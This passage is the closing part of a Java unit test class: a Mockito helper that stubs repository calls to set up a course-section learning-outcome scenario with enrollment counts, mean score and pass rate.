  private void stubCourseSectionsCloScenario(
      String courseId,
      List<CourseSection> sections,
      Clo clo,
      int enrolled,
      int passed,
      int failed,
      double mean,
      double passRate) {
    when(calculationRunRepository.findById("run_success_1")).thenReturn(Optional.of(successRun));
    when(courseSectionRepository.findByCourseId(courseId)).thenReturn(sections);
    when(scopeAuthorizationService.canAccessLoadedSection(any(), any(), any())).thenReturn(true);
    when(mongoTemplate.find(any(Query.class), eq(Clo.class))).thenReturn(List.of(clo));

    AggregateResult agg =
        AggregateResult.builder()
            .runId("run_success_1")
            .level(ResultLevel.CLO)
            .subjectId(clo.getId())
            .sectionId(sections.get(0).getId())
            .counts(
                AggregateResult.Counts.builder()
                    .enrolled(enrolled)
                    .passed(passed)
                    .failed(failed)
                    .build())
            .mean(mean)
            .passRate(passRate)
            .build();

    when(aggregateResultRepository.findByRunIdAndLevel("run_success_1", ResultLevel.CLO))
        .thenReturn(List.of(agg));
  }
}
